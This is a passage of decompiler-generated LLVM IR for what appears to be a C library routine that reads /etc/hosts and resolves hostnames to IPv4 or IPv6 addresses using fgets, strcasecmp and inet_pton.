dec_label_pc_8053ff1:                             ; preds = %dec_label_pc_8053fe7, %dec_label_pc_8053fec
  %v0_8053ff1 = phi i32 [ %v1_8053fd6, %dec_label_pc_8053fe7 ], [ %v1_8053fdd, %dec_label_pc_8053fec ]
  %tmp154 = icmp ult i32 %v0_8053ff1, 80
  br i1 %tmp154, label %dec_label_pc_8054225, label %dec_label_pc_8053ffa

dec_label_pc_8053ffa:                             ; preds = %dec_label_pc_8053ff1
  %v0_8053ffa = call i32 @__open_etc_hosts()
  store i32 %v0_8053ffa, i32* %eax.global-to-local, align 4
  %v1_8054003 = icmp eq i32 %v0_8053ffa, 0
  br i1 %v1_8054003, label %dec_label_pc_8054027, label %dec_label_pc_8054007

dec_label_pc_8054007:                             ; preds = %dec_label_pc_8053ffa
  store i32 %v1_8053f8a, i32* %edx.global-to-local, align 4
  store i32 %v1_8053fd3, i32* %eax.global-to-local, align 4
  store i8* %v5_8053f90, i8** %stack_var_-44, align 4
  %v0_8054012 = load i32, i32* @edi, align 4
  %v0_805401e = load i32, i32* @esi, align 4
  %v5_805401e = inttoptr i32 %v0_805401e to i8*
  br label %dec_label_pc_80540d5

dec_label_pc_8054027:                             ; preds = %dec_label_pc_8053ffa
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_805402b = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_805402b, align 4
  %v1_8054031 = call i32 @__errno_location(i32 0)
  store i32 %v1_8054031, i32* %eax.global-to-local, align 4
  %v1_8054036 = inttoptr i32 %v1_8054031 to i32*
  %v2_8054036 = load i32, i32* %v1_8054036, align 4
  store i32 %v2_8054036, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054225

dec_label_pc_8054041:                             ; preds = %dec_label_pc_80541a8
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_8054045 = load i8*, i8** %stack_var_-44, align 4
  %v3_8054045 = ptrtoint i8* %v2_8054045 to i32
  %v2_8054048 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8054045, i32* %v2_8054048, align 4
  %v0_805404a = load i32, i32* %eax.global-to-local, align 4
  %v1_805404a = add i32 %v0_805404a, 4
  %v2_805404a = inttoptr i32 %v1_805404a to i32*
  store i32 0, i32* %v2_805404a, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8054055 = load i32, i32* @ebx, align 4
  %v1_8054055 = add i32 %v0_8054055, 4
  %v2_8054055 = inttoptr i32 %v1_8054055 to i32*
  %v3_8054055 = load i32, i32* %v2_8054055, align 4
  store i32 %v3_8054055, i32* %eax.global-to-local, align 4
  store i32 %v3_8054055, i32* %arg5, align 4
  %v0_805405a = load i32, i32* %edx.global-to-local, align 4
  %v1_805405a = add i32 %v0_805405a, 8
  %v2_805405a = inttoptr i32 %v1_805405a to i32*
  store i32 2, i32* %v2_805405a, align 4
  %v0_8054061 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054061 = add i32 %v0_8054061, 12
  %v2_8054061 = inttoptr i32 %v1_8054061 to i32*
  store i32 4, i32* %v2_8054061, align 4
  br label %dec_label_pc_805409a

dec_label_pc_805406e:                             ; preds = %dec_label_pc_80541ca
  store i32 %stack_var_-32.0, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  %v2_8054076 = inttoptr i32 %stack_var_-32.0 to i32*
  store i32 %stack_var_-36.0, i32* %v2_8054076, align 4
  %v0_8054078 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054078 = add i32 %v0_8054078, 4
  %v2_8054078 = inttoptr i32 %v1_8054078 to i32*
  store i32 0, i32* %v2_8054078, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_8054083 = load i32, i32* @ebx, align 4
  %v1_8054083 = add i32 %v0_8054083, 4
  %v2_8054083 = inttoptr i32 %v1_8054083 to i32*
  %v3_8054083 = load i32, i32* %v2_8054083, align 4
  store i32 %v3_8054083, i32* %eax.global-to-local, align 4
  store i32 %v3_8054083, i32* %arg5, align 4
  %v0_8054088 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054088 = add i32 %v0_8054088, 8
  %v2_8054088 = inttoptr i32 %v1_8054088 to i32*
  store i32 10, i32* %v2_8054088, align 4
  %v0_805408f = load i32, i32* %edx.global-to-local, align 4
  %v1_805408f = add i32 %v0_805408f, 12
  %v2_805408f = inttoptr i32 %v1_805408f to i32*
  store i32 16, i32* %v2_805408f, align 4
  br label %dec_label_pc_805409a

dec_label_pc_805409a:                             ; preds = %dec_label_pc_8054041, %dec_label_pc_805406e
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8054041 ], [ %stack_var_-32.0, %dec_label_pc_805406e ]
  %v1_805409a = load i32, i32* %edx.global-to-local, align 4
  %v2_805409a = add i32 %v1_805409a, 16
  %v3_805409a = inttoptr i32 %v2_805409a to i32*
  store i32 %storemerge, i32* %v3_805409a, align 4
  %v0_805409d = load i32, i32* @ebx, align 4
  %v1_805409d = add i32 %v0_805409d, 8
  %v1_80540a0 = load i32, i32* %edx.global-to-local, align 4
  %v2_80540a0 = add i32 %v1_80540a0, 4
  %v3_80540a0 = inttoptr i32 %v2_80540a0 to i32*
  store i32 %v1_805409d, i32* %v3_80540a0, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_80540a7 = load i32, i32* %edx.global-to-local, align 4
  %v2_80540a7 = inttoptr i32 %arg8 to i32*
  store i32 %v0_80540a7, i32* %v2_80540a7, align 4
  br label %dec_label_pc_8054205

dec_label_pc_80540b6:                             ; preds = %dec_label_pc_8053f8a
  store i8* null, i8** %stack_var_-44, align 4
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_80540d5

dec_label_pc_80540d5:                             ; preds = %dec_label_pc_8054007, %dec_label_pc_80540b6
  %v1_80540d9.pre-phi = phi i32* [ %v1_8053fa6, %dec_label_pc_8054007 ], [ %.pre, %dec_label_pc_80540b6 ]
  %stack_var_-32.0 = phi i32 [ %v1_8053fd3, %dec_label_pc_8054007 ], [ 0, %dec_label_pc_80540b6 ]
  %stack_var_-36.0 = phi i32 [ %v1_8053f8a, %dec_label_pc_8054007 ], [ 0, %dec_label_pc_80540b6 ]
  %stack_var_-40.0 = phi i32 [ %v0_8054012, %dec_label_pc_8054007 ], [ 0, %dec_label_pc_80540b6 ]
  %stack_var_4.0 = phi i32 [ %v0_8053ffa, %dec_label_pc_8054007 ], [ %arg1, %dec_label_pc_80540b6 ]
  %stack_var_-20.0 = phi i8* [ %v5_805401e, %dec_label_pc_8054007 ], [ %v5_8053f90, %dec_label_pc_80540b6 ]
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_80540d9.pre-phi, align 4
  %v4_80541f1 = ptrtoint i8* %stack_var_-20.0 to i32
  %v2_805418e = inttoptr i32 %arg2 to i8*
  %v0_80541eb120127 = load i32, i32* @edx, align 4
  %v3_80541f5121128 = call i32 @fgets(i32 %v4_80541f1, i32 %stack_var_4.0, i32 %v0_80541eb120127)
  store i32 %v3_80541f5121128, i32* @eax, align 4
  %v1_80541fd122129 = icmp eq i32 %v3_80541f5121128, 0
  %v1_80541ff123130 = icmp eq i1 %v1_80541fd122129, false
  br i1 %v1_80541ff123130, label %dec_label_pc_80540ec.lr.ph.lr.ph, label %dec_label_pc_8054205

dec_label_pc_80540ec.lr.ph.lr.ph:                 ; preds = %dec_label_pc_80540d5
  %v12_80541c3 = icmp eq i32 %arg3, 10
  %v12_80541a1 = icmp eq i32 %arg3, 2
  %v12_8054168 = icmp eq i32 %arg4, 2
  %v1_805416d = icmp eq i1 %v12_8054168, false
  %v1_80541a6 = icmp eq i1 %v12_80541a1, false
  %v1_80541c8 = icmp eq i1 %v12_80541c3, false
  br label %dec_label_pc_80540ec.lr.ph

dec_label_pc_80540ec.lr.ph:                       ; preds = %dec_label_pc_80540ec.lr.ph.lr.ph, %dec_label_pc_80541eb.outer.backedge
  %stack_var_-28.0.ph131 = phi i32 [ 1, %dec_label_pc_80540ec.lr.ph.lr.ph ], [ 2, %dec_label_pc_80541eb.outer.backedge ]
  br label %dec_label_pc_80540ec

dec_label_pc_80540ec:                             ; preds = %dec_label_pc_80540ec.lr.ph, %dec_label_pc_80541eb.backedge
  %v3_80540f4 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_80540f4, i32* @eax, align 4
  %v1_80540fc = icmp eq i32 %v3_80540f4, 0
  br i1 %v1_80540fc, label %dec_label_pc_8054103, label %dec_label_pc_8054100

dec_label_pc_8054100:                             ; preds = %dec_label_pc_80540ec
  %v1_8054100 = inttoptr i32 %v3_80540f4 to i8*
  store i8 0, i8* %v1_8054100, align 1
  br label %dec_label_pc_8054103

dec_label_pc_8054103:                             ; preds = %dec_label_pc_80540ec, %dec_label_pc_8054100
  store i32 %v4_80541f1, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_805414332 = load i8, i8* %stack_var_-20.0, align 1
  %v3_805414333 = icmp eq i8 %v2_805414332, 0
  %v1_805414639 = icmp eq i1 %v3_805414333, false
  br i1 %v1_805414639, label %dec_label_pc_805410f.preheader.preheader, label %dec_label_pc_8054148

dec_label_pc_805410f.preheader.preheader:         ; preds = %dec_label_pc_8054103
  %v4_805410f97.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_805410f.preheader

dec_label_pc_805410b:                             ; preds = %dec_label_pc_8054115
  store i8 0, i8* %v1_805410f102, align 1
  %v0_805410e = load i32, i32* @ecx, align 4
  %v1_805410e = add i32 %v0_805410e, 1
  store i32 %v1_805410e, i32* @ecx, align 4
  %v1_805410f = inttoptr i32 %v1_805410e to i8*
  %v2_805410f = load i8, i8* %v1_805410f, align 1
  %v3_805410f = zext i8 %v2_805410f to i32
  %v4_805410f = load i32, i32* %eax.global-to-local, align 4
  %v5_805410f = and i32 %v4_805410f, -256
  %v6_805410f = or i32 %v5_805410f, %v3_805410f
  store i32 %v6_805410f, i32* @eax, align 4
  %v4_8054111 = icmp eq i8 %v2_805410f, 0
  br i1 %v4_8054111, label %dec_label_pc_805410f.dec_label_pc_8054148.loopexit_crit_edge, label %dec_label_pc_8054115

dec_label_pc_8054115:                             ; preds = %dec_label_pc_805410f.preheader, %dec_label_pc_805410b
  %v2_805410f103 = phi i8 [ %v2_805410f, %dec_label_pc_805410b ], [ %v2_805410f95, %dec_label_pc_805410f.preheader ]
  %v1_805410f102 = phi i8* [ %v1_805410f, %dec_label_pc_805410b ], [ %v1_805410f94, %dec_label_pc_805410f.preheader ]
  %v0_805410b101 = phi i32 [ %v1_805410e, %dec_label_pc_805410b ], [ %v0_805410f47, %dec_label_pc_805410f.preheader ]
  %v2_8054115 = sext i8 %v2_805410f103 to i32
  store i32 %v2_8054115, i32* @edx, align 4
  %v0_8054118 = load i32, i32* @global_var_8059858, align 8
  store i32 %v0_8054118, i32* %eax.global-to-local, align 4
  %v2_805411d = mul nsw i32 %v2_8054115, 2
  %v3_805411d = add i32 %v0_8054118, %v2_805411d
  %v4_805411d = inttoptr i32 %v3_805411d to i8*
  %v5_805411d = load i8, i8* %v4_805411d, align 1
  %v6_805411d = and i8 %v5_805411d, 32
  %v7_805411d = icmp eq i8 %v6_805411d, 0
  %v1_8054121 = icmp eq i1 %v7_805411d, false
  br i1 %v1_8054121, label %dec_label_pc_805410b, label %dec_label_pc_8054123

dec_label_pc_8054123:                             ; preds = %dec_label_pc_8054115
  %v0_8054123 = load i32, i32* @edi, align 4
  %v1_8054123 = add i32 %v0_8054123, -6
  %v6_8054123 = sub i32 5, %v0_8054123
  %v7_8054123 = and i32 %v6_8054123, %v0_8054123
  %v8_8054123 = icmp slt i32 %v7_8054123, 0
  %v9_8054123 = icmp eq i32 %v1_8054123, 0
  %v10_8054123 = icmp slt i32 %v1_8054123, 0
  %v3_8054126 = icmp eq i1 %v10_8054123, %v8_8054123
  %v4_8054126 = icmp eq i1 %v9_8054123, false
  %v5_8054126 = and i1 %v4_8054126, %v3_8054126
  br i1 %v5_8054126, label %dec_label_pc_805412f.preheader, label %dec_label_pc_8054128

dec_label_pc_8054128:                             ; preds = %dec_label_pc_8054123
  %v1_8054128 = load i32, i32* @ebx, align 4
  %v3_8054128 = mul i32 %v0_8054123, 4
  %v4_8054128 = add i32 %v1_8054128, %v3_8054128
  %v5_8054128 = inttoptr i32 %v4_8054128 to i32*
  store i32 %v0_805410b101, i32* %v5_8054128, align 4
  %v0_805412b = load i32, i32* @edi, align 4
  %v1_805412b = add i32 %v0_805412b, 1
  store i32 %v1_805412b, i32* @edi, align 4
  %v0_805412f.pre.pre = load i32, i32* @ecx, align 4
  %v4_805412f.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805412f.preheader

dec_label_pc_805412f.preheader:                   ; preds = %dec_label_pc_8054128, %dec_label_pc_8054123
  %v4_805412f.pre = phi i32 [ %v4_805412f.pre.pre, %dec_label_pc_8054128 ], [ %v0_8054118, %dec_label_pc_8054123 ]
  %v0_805412f.pre = phi i32 [ %v0_805412f.pre.pre, %dec_label_pc_8054128 ], [ %v0_805410b101, %dec_label_pc_8054123 ]
  %v1_805414852 = phi i32 [ %v1_805412b, %dec_label_pc_8054128 ], [ %v0_8054123, %dec_label_pc_8054123 ]
  %v1_805412f104 = inttoptr i32 %v0_805412f.pre to i8*
  %v2_805412f105 = load i8, i8* %v1_805412f104, align 1
  %v3_805412f106 = zext i8 %v2_805412f105 to i32
  %v5_805412f107 = and i32 %v4_805412f.pre, -256
  %v6_805412f108 = or i32 %v3_805412f106, %v5_805412f107
  store i32 %v6_805412f108, i32* @eax, align 4
  %v4_8054131109 = icmp eq i8 %v2_805412f105, 0
  br i1 %v4_8054131109, label %dec_label_pc_8054143.loopexit, label %dec_label_pc_8054135.lr.ph

dec_label_pc_8054135.lr.ph:                       ; preds = %dec_label_pc_805412f.preheader
  %v0_8054138.pre = load i32, i32* @global_var_8059858, align 8
  br label %dec_label_pc_8054135

dec_label_pc_805412e:                             ; preds = %dec_label_pc_8054135
  %v1_805412e = add i32 %v0_8054143110, 1
  store i32 %v1_805412e, i32* @ecx, align 4
  %v1_805412f = inttoptr i32 %v1_805412e to i8*
  %v2_805412f = load i8, i8* %v1_805412f, align 1
  %v3_805412f = zext i8 %v2_805412f to i32
  %v5_805412f = and i32 %v0_8054138.pre, -256
  %v6_805412f = or i32 %v3_805412f, %v5_805412f
  store i32 %v6_805412f, i32* @eax, align 4
  %v4_8054131 = icmp eq i8 %v2_805412f, 0
  br i1 %v4_8054131, label %dec_label_pc_8054143.loopexit, label %dec_label_pc_8054135

dec_label_pc_8054135:                             ; preds = %dec_label_pc_8054135.lr.ph, %dec_label_pc_805412e
  %v2_805412f112 = phi i8 [ %v2_805412f105, %dec_label_pc_8054135.lr.ph ], [ %v2_805412f, %dec_label_pc_805412e ]
  %v1_805412f111 = phi i8* [ %v1_805412f104, %dec_label_pc_8054135.lr.ph ], [ %v1_805412f, %dec_label_pc_805412e ]
  %v0_8054143110 = phi i32 [ %v0_805412f.pre, %dec_label_pc_8054135.lr.ph ], [ %v1_805412e, %dec_label_pc_805412e ]
  %v2_8054135 = sext i8 %v2_805412f112 to i32
  store i32 %v2_8054135, i32* @edx, align 4
  store i32 %v0_8054138.pre, i32* @eax, align 4
  %v2_805413d = mul nsw i32 %v2_8054135, 2
  %v3_805413d = add i32 %v0_8054138.pre, %v2_805413d
  %v4_805413d = inttoptr i32 %v3_805413d to i8*
  %v5_805413d = load i8, i8* %v4_805413d, align 1
  %v6_805413d = and i8 %v5_805413d, 32
  %v7_805413d = icmp eq i8 %v6_805413d, 0
  br i1 %v7_805413d, label %dec_label_pc_805412e, label %dec_label_pc_8054143.loopexit

dec_label_pc_8054143.loopexit:                    ; preds = %dec_label_pc_8054135, %dec_label_pc_805412e, %dec_label_pc_805412f.preheader
  %v4_805410f97144 = phi i32 [ %v6_805412f108, %dec_label_pc_805412f.preheader ], [ %v6_805412f, %dec_label_pc_805412e ], [ %v0_8054138.pre, %dec_label_pc_8054135 ]
  %v0_8054143.lcssa = phi i32 [ %v0_805412f.pre, %dec_label_pc_805412f.preheader ], [ %v1_805412e, %dec_label_pc_805412e ], [ %v0_8054143110, %dec_label_pc_8054135 ]
  %v1_805412f.lcssa = phi i8* [ %v1_805412f104, %dec_label_pc_805412f.preheader ], [ %v1_805412f, %dec_label_pc_805412e ], [ %v1_805412f111, %dec_label_pc_8054135 ]
  %v2_8054143 = load i8, i8* %v1_805412f.lcssa, align 1
  %v3_8054143 = icmp eq i8 %v2_8054143, 0
  %v1_8054146 = icmp eq i1 %v3_8054143, false
  br i1 %v1_8054146, label %dec_label_pc_805410f.preheader, label %dec_label_pc_8054148

dec_label_pc_805410f.preheader:                   ; preds = %dec_label_pc_805410f.preheader.preheader, %dec_label_pc_8054143.loopexit
  %v1_8054148.pre147 = phi i32 [ %v1_805414852, %dec_label_pc_8054143.loopexit ], [ 0, %dec_label_pc_805410f.preheader.preheader ]
  %v4_805410f97 = phi i32 [ %v4_805410f97144, %dec_label_pc_8054143.loopexit ], [ %v4_805410f97.pre, %dec_label_pc_805410f.preheader.preheader ]
  %v0_805410f47 = phi i32 [ %v0_8054143.lcssa, %dec_label_pc_8054143.loopexit ], [ %v4_80541f1, %dec_label_pc_805410f.preheader.preheader ]
  %v1_805410f94 = inttoptr i32 %v0_805410f47 to i8*
  %v2_805410f95 = load i8, i8* %v1_805410f94, align 1
  %v3_805410f96 = zext i8 %v2_805410f95 to i32
  %v5_805410f98 = and i32 %v4_805410f97, -256
  %v6_805410f99 = or i32 %v5_805410f98, %v3_805410f96
  store i32 %v6_805410f99, i32* @eax, align 4
  %v4_8054111100 = icmp eq i8 %v2_805410f95, 0
  br i1 %v4_8054111100, label %dec_label_pc_8054148, label %dec_label_pc_8054115

dec_label_pc_805410f.dec_label_pc_8054148.loopexit_crit_edge: ; preds = %dec_label_pc_805410b
  %v1_8054148.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8054148

dec_label_pc_8054148:                             ; preds = %dec_label_pc_8054143.loopexit, %dec_label_pc_805410f.dec_label_pc_8054148.loopexit_crit_edge, %dec_label_pc_805410f.preheader, %dec_label_pc_8054103
  %v1_8054148 = phi i32 [ 0, %dec_label_pc_8054103 ], [ %v1_8054148.pre.pre, %dec_label_pc_805410f.dec_label_pc_8054148.loopexit_crit_edge ], [ %v1_8054148.pre147, %dec_label_pc_805410f.preheader ], [ %v1_805414852, %dec_label_pc_8054143.loopexit ]
  %v0_8054148 = load i32, i32* @ebx, align 4
  %v2_8054148 = mul i32 %v1_8054148, 4
  %v3_8054148 = add i32 %v2_8054148, %v0_8054148
  %v4_8054148 = inttoptr i32 %v3_8054148 to i32*
  store i32 0, i32* %v4_8054148, align 4
  %v0_805414f = load i32, i32* @edi, align 4
  %v7_8054152 = icmp sgt i32 %v0_805414f, 1
  br i1 %v7_8054152, label %dec_label_pc_8054158, label %dec_label_pc_80541eb.backedge

dec_label_pc_8054158:                             ; preds = %dec_label_pc_8054148
  br i1 %v12_8053f94, label %dec_label_pc_8054225, label %dec_label_pc_8054163

dec_label_pc_8054163:                             ; preds = %dec_label_pc_8054158
  store i32 1, i32* @esi, align 4
  br i1 %v1_805416d, label %dec_label_pc_8054185.lr.ph, label %dec_label_pc_805416f

dec_label_pc_8054185.lr.ph:                       ; preds = %dec_label_pc_8054163
  br label %dec_label_pc_8054185

dec_label_pc_805416f:                             ; preds = %dec_label_pc_8054163
  %v0_805416f = load i32, i32* @eax, align 4
  %v0_8054171 = load i32, i32* @ebx, align 4
  %v1_8054171 = inttoptr i32 %v0_8054171 to i32*
  %v2_8054171 = load i32, i32* %v1_8054171, align 4
  %v5_8054177 = call i32 @__GI_strcoll(i8* %v2_805418e, i32 %v2_8054171, i32 %v0_805416f, i32 %v0_805416f)
  store i32 %v5_8054177, i32* %eax.global-to-local, align 4
  %v1_805417f = icmp eq i32 %v5_8054177, 0
  %v1_8054181 = icmp eq i1 %v1_805417f, false
  br i1 %v1_8054181, label %dec_label_pc_80541eb.backedge, label %dec_label_pc_80541a1

dec_label_pc_80541eb.backedge:                    ; preds = %dec_label_pc_805419a, %dec_label_pc_805416f, %dec_label_pc_8054148
  %v0_80541eb = load i32, i32* @edx, align 4
  %v3_80541f5 = call i32 @fgets(i32 %v4_80541f1, i32 %stack_var_4.0, i32 %v0_80541eb)
  store i32 %v3_80541f5, i32* @eax, align 4
  %v1_80541fd = icmp eq i32 %v3_80541f5, 0
  %v1_80541ff = icmp eq i1 %v1_80541fd, false
  br i1 %v1_80541ff, label %dec_label_pc_80540ec, label %dec_label_pc_8054205

dec_label_pc_8054185:                             ; preds = %dec_label_pc_8054185.lr.ph, %dec_label_pc_805419a
  %v1_8054187119 = phi i32 [ 1, %dec_label_pc_8054185.lr.ph ], [ %v1_805419a, %dec_label_pc_805419a ]
  %v0_8054187 = load i32, i32* @ebx, align 4
  %v2_8054187 = mul i32 %v1_8054187119, 4
  %v3_8054187 = add i32 %v0_8054187, %v2_8054187
  %v4_8054187 = inttoptr i32 %v3_8054187 to i32*
  %v5_8054187 = load i32, i32* %v4_8054187, align 4
  %v3_805418e = call i32 @__GI_strcasecmp(i8* %v2_805418e, i32 %v5_8054187)
  store i32 %v3_805418e, i32* %eax.global-to-local, align 4
  %v1_8054196 = icmp eq i32 %v3_805418e, 0
  br i1 %v1_8054196, label %dec_label_pc_80541a1, label %dec_label_pc_805419a

dec_label_pc_805419a:                             ; preds = %dec_label_pc_8054185
  %v0_805419a = load i32, i32* @esi, align 4
  %v1_805419a = add i32 %v0_805419a, 1
  store i32 %v1_805419a, i32* @esi, align 4
  %v1_805419b.pre = load i32, i32* @edi, align 4
  %v5_805419d = icmp slt i32 %v1_805419a, %v1_805419b.pre
  br i1 %v5_805419d, label %dec_label_pc_8054185, label %dec_label_pc_80541eb.backedge

dec_label_pc_80541a1:                             ; preds = %dec_label_pc_805416f, %dec_label_pc_8054185
  br i1 %v1_80541a6, label %dec_label_pc_80541c3, label %dec_label_pc_80541a8

dec_label_pc_80541a8:                             ; preds = %dec_label_pc_80541a1
  %v0_80541a8 = load i32, i32* @esi, align 4
  %v3_80541a9 = load i8*, i8** %stack_var_-44, align 4
  %v4_80541a9 = ptrtoint i8* %v3_80541a9 to i32
  %v0_80541ad = load i32, i32* @ebx, align 4
  %v1_80541ad = inttoptr i32 %v0_80541ad to i32*
  %v2_80541ad = load i32, i32* %v1_80541ad, align 4
  %v4_80541b1 = inttoptr i32 %v2_80541ad to i8*
  %v5_80541b1 = call i32 @inet_pton(i32 2, i8* %v4_80541b1, i32 %v4_80541a9, i32 %v0_80541a8)
  store i32 %v5_80541b1, i32* %eax.global-to-local, align 4
  %tmp84 = icmp slt i32 %v5_80541b1, 1
  %tmp85 = icmp eq i1 %tmp84, false
  br i1 %tmp85, label %dec_label_pc_8054041, label %dec_label_pc_80541eb.outer.backedge

dec_label_pc_80541eb.outer.backedge:              ; preds = %dec_label_pc_80541a8, %dec_label_pc_80541ca, %dec_label_pc_80541c3
  %v0_80541eb120 = load i32, i32* @edx, align 4
  %v3_80541f5121 = call i32 @fgets(i32 %v4_80541f1, i32 %stack_var_4.0, i32 %v0_80541eb120)
  store i32 %v3_80541f5121, i32* @eax, align 4
  %v1_80541fd122 = icmp eq i32 %v3_80541f5121, 0
  %v1_80541ff123 = icmp eq i1 %v1_80541fd122, false
  br i1 %v1_80541ff123, label %dec_label_pc_80540ec.lr.ph, label %dec_label_pc_8054205

dec_label_pc_80541c3:                             ; preds = %dec_label_pc_80541a1
  br i1 %v1_80541c8, label %dec_label_pc_80541eb.outer.backedge, label %dec_label_pc_80541ca

dec_label_pc_80541ca:                             ; preds = %dec_label_pc_80541c3
  %v0_80541ca = load i32, i32* @ecx, align 4
  %v0_80541cf = load i32, i32* @ebx, align 4
  %v1_80541cf = inttoptr i32 %v0_80541cf to i32*
  %v2_80541cf = load i32, i32* %v1_80541cf, align 4
  %v4_80541d3 = inttoptr i32 %v2_80541cf to i8*
  %v5_80541d3 = call i32 @inet_pton(i32 10, i8* %v4_80541d3, i32 %stack_var_-36.0, i32 %v0_80541ca)
  store i32 %v5_80541d3, i32* %eax.global-to-local, align 4
  %tmp86 = icmp slt i32 %v5_80541d3, 1
  %tmp87 = icmp eq i1 %tmp86, false
  br i1 %tmp87, label %dec_label_pc_805406e, label %dec_label_pc_80541eb.outer.backedge

dec_label_pc_8054205:                             ; preds = %dec_label_pc_80541eb.outer.backedge, %dec_label_pc_80540d5, %dec_label_pc_80541eb.backedge, %dec_label_pc_805409a
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_805409a ], [ 1, %dec_label_pc_80540d5 ], [ 2, %dec_label_pc_80541eb.outer.backedge ], [ %stack_var_-28.0.ph131, %dec_label_pc_80541eb.backedge ]
  br i1 %v12_8053f94, label %dec_label_pc_8054225, label %dec_label_pc_805420c

dec_label_pc_805420c:                             ; preds = %dec_label_pc_8054205
  %v1_8054213 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_8054213 = call i32 @__GI_fclose(i16* %v1_8054213)
  store i32 %v2_8054213, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054225

dec_label_pc_8054225:                             ; preds = %dec_label_pc_8054158, %dec_label_pc_8053f75, %dec_label_pc_8053f81, %dec_label_pc_8053f9f, %dec_label_pc_8053fb2, %dec_label_pc_8053fbe, %dec_label_pc_8053fc7, %dec_label_pc_8053ff1, %dec_label_pc_8054205, %dec_label_pc_805420c, %dec_label_pc_8054027
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8054205 ], [ %stack_var_-28.1, %dec_label_pc_805420c ], [ %v2_8054036, %dec_label_pc_8054027 ], [ 34, %dec_label_pc_8053ff1 ], [ 34, %dec_label_pc_8053fc7 ], [ 34, %dec_label_pc_8053fbe ], [ 34, %dec_label_pc_8053fb2 ], [ 34, %dec_label_pc_8053f9f ], [ 34, %dec_label_pc_8053f81 ], [ 34, %dec_label_pc_8053f75 ], [ %stack_var_-28.0.ph131, %dec_label_pc_8054158 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8053f60, i32* @ebx, align 4
  store i32 %v0_8053f5f, i32* @esi, align 4
  store i32 %v0_8053f5e, i32* @edi, align 4
  store i32 %v0_8053f5d, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_805419a, { 0, 2, 1 }
  uselistorder i8 %v2_805410f95, { 1, 2, 0 }
  uselistorder i8* %v1_805410f94, { 1, 0 }
  uselistorder i32 %v0_805410f47, { 1, 0 }
  uselistorder i32 %v2_8054135, { 1, 0 }
  uselistorder i32 %v1_805412e, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8054138.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8054123, { 1, 0 }
  uselistorder i32 %v0_8054123, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8054115, { 1, 0 }
  uselistorder i8* %v2_805418e, { 1, 0 }
  uselistorder i32 %v4_80541f1, { 1, 4, 2, 3, 0 }
  uselistorder i32 %stack_var_4.0, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0 }
  uselistorder i32 %v0_8053fb2, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8053f8d, { 1, 0 }
  uselistorder i32 %v1_8053f70, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 3, 2, 1, 0 }
  uselistorder i32 %tmp59, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 14, 13, 15 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 12, 13, 11, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 2, 3, 4, 5, 6, 7, 8, 11, 12, 13, 14, 10, 0, 1, 16, 17, 15, 9 }
  uselistorder i32 (i16*)* @__GI_fclose, { 3, 4, 0, 2, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 5, { 15, 23, 24, 25, 0, 14, 8, 9, 18, 10, 26, 27, 1, 3, 22, 4, 11, 5, 19, 6, 20, 7, 21, 12, 13, 16, 17, 2 }
  uselistorder i32 -6, { 1, 0 }
  uselistorder i8 32, { 17, 18, 19, 20, 21, 14, 0, 1, 13, 2, 22, 15, 16, 23, 24, 7, 11, 3, 4, 8, 12, 5, 6, 9, 10 }
  uselistorder i32* @global_var_8059858, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 -256, { 1, 97, 0, 98, 21, 22, 99, 101, 3, 55, 54, 2, 102, 103, 6, 104, 4, 105, 5, 106, 126, 8, 57, 56, 7, 76, 77, 107, 78, 79, 80, 81, 82, 83, 135, 84, 42, 43, 44, 95, 136, 128, 129, 137, 120, 119, 9, 41, 100, 108, 85, 86, 87, 88, 89, 10, 90, 91, 11, 92, 93, 94, 109, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 45, 46, 47, 48, 49, 50, 51, 52, 53, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 18, 19, 20, 96, 17, 110, 111, 112, 113, 114, 115, 116, 117, 118, 121, 123, 122, 124, 125, 12, 127, 134, 131, 14, 132, 15, 133, 13, 130, 16 }
